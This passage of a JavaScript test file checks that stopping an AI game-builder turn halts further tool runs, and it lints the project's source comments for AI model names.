  const r = await runTurn({ user: u, gameId: g.id, text: 'a fox game', signal: ac.signal, emit: (n, d) => { events.push([n, d]); if (n === 'text' && !ac.signal.aborted) ac.abort(); } });
  assert.equal(streamed().length - before, 1, 'no more requests');
  assert.deepEqual(events.filter(e => e[0] === 'error'), [], 'a stop is not the Builder getting muddled');
  const done = events.find(e => e[0] === 'done')[1];
  assert.equal(done.end, 'stopped'); assert.equal(done.steps.end, 'stopped');
  assert.equal(games.listVersions(g.id).length, 0, 'the tool after the stop never ran');
  assert.deepEqual([r.ok, r.error], [false, 'stopped']);
  assert.equal(script.length, 0);
});

test('CL-12 no model identifiers in code comments (code values like config defaults are fine)', async () => {
  const fs = await import('node:fs'); const path = await import('node:path');
  const ROOT = path.resolve(import.meta.dirname, '../..');
  const files = [
    ...fs.readdirSync(path.join(ROOT, 'server'), { recursive: true }).filter(f => f.endsWith('.js')).map(f => path.join(ROOT, 'server', f)),
    ...fs.readdirSync(path.join(ROOT, 'public/js')).filter(f => f.endsWith('.js')).map(f => path.join(ROOT, 'public/js', f)),
  ];
  const MODEL = /\bclaude-[a-z]+-\d|\b(sonnet|opus|haiku)\b/i;
  const even = (s, ch) => (s.split(ch).length - 1) % 2 === 0;
  const bad = [];
  for (const f of files) {
    fs.readFileSync(f, 'utf8').split('\n').forEach((line, k) => {
      let comment = /^\s*(\/\/|\/\*|\*)/.test(line) ? line : null;
      if (!comment) { const m = line.match(/\s\/\/\s.*$/); if (m && ["'", '"', '`'].every(ch => even(line.slice(0, m.index), ch))) comment = m[0]; }
      if (comment && MODEL.test(comment)) bad.push(`${path.relative(ROOT, f)}:${k + 1}: ${line.trim()}`);
    });
  }
  assert.ok(files.length > 50);
  assert.deepEqual(bad, []);
});
